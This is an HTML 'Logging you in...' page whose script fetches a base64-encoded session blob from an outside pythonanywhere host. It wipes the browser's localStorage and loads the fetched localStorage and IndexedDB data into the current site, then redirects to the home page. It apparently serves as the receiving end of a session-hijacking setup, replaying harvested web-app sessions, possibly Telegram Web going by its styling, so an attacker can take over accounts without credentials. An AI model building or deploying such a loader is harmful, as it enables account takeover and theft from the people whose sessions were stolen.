<!DOCTYPE html>
<html>
<head>
    <title>Logging in...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0e0e0e;color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center}
        .container{text-align:center;padding:40px}
        .spinner{width:50px;height:50px;border:4px solid #333;border-top:4px solid #0088cc;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 20px}
        @keyframes spin{to{transform:rotate(360deg)}}
        h2{margin-bottom:10px}
        p{color:#888}
        .error{color:#ff6b6b}
    </style>
</head>
<body>
    <div class="container">
        <div class="spinner" id="spinner"></div>
        <h2 id="title">Logging you in...</h2>
        <p id="msg">Please wait</p>
    </div>
    <script>
        (async function(){
            const params = new URLSearchParams(window.location.search);
            const sessionId = params.get('id');
            
            if(!sessionId){
                document.getElementById('spinner').style.display='none';
                document.getElementById('title').textContent='Error';
                document.getElementById('msg').className='error';
                document.getElementById('msg').textContent='No session ID provided';
                return;
            }
            
            try{
                const res = await fetch('https://azans.pythonanywhere.com/api/get-session/'+sessionId);
                const json = await res.json();
                
                if(!json.success){
                    throw new Error(json.error || 'Session not found');
                }
                
                const data = JSON.parse(decodeURIComponent(escape(atob(json.data))));
                
                localStorage.clear();
                for(const[key,value]of Object.entries(data.localStorage)){
                    localStorage.setItem(key,value);
                }
                
                for(const[dbName,stores]of Object.entries(data.indexedDB)){
                    const storeNames=Object.keys(stores);
                    if(storeNames.length===0)continue;
                    const db=await new Promise((resolve,reject)=>{
                        const request=indexedDB.open(dbName,1);
                        request.onupgradeneeded=(e)=>{
                            const db=e.target.result;
                            for(const storeName of storeNames){
                                if(!db.objectStoreNames.contains(storeName)){
                                    db.createObjectStore(storeName);
                                }
                            }
                        };
                        request.onsuccess=()=>resolve(request.result);
                        request.onerror=()=>reject(request.error);
                    });
                    for(const[storeName,{keys,items}]of Object.entries(stores)){
                        try{
                            const tx=db.transaction(storeName,'readwrite');
                            const store=tx.objectStore(storeName);
                            for(let i=0;i<keys.length;i++){
                                store.put(items[i],keys[i]);
                            }
                            await new Promise((resolve,reject)=>{
                                tx.oncomplete=resolve;
                                tx.onerror=()=>reject(tx.error);
                            });
                        }catch(e){}
                    }
                    db.close();
                }
                
                document.getElementById('title').textContent='Success!';
                document.getElementById('msg').textContent='Redirecting...';
                setTimeout(()=>window.location.href='/',1000);
                
            }catch(e){
                document.getElementById('spinner').style.display='none';
                document.getElementById('title').textContent='Error';
                document.getElementById('msg').className='error';
                document.getElementById('msg').textContent=e.message;
            }
        })();
    </script>
</body>
</html>
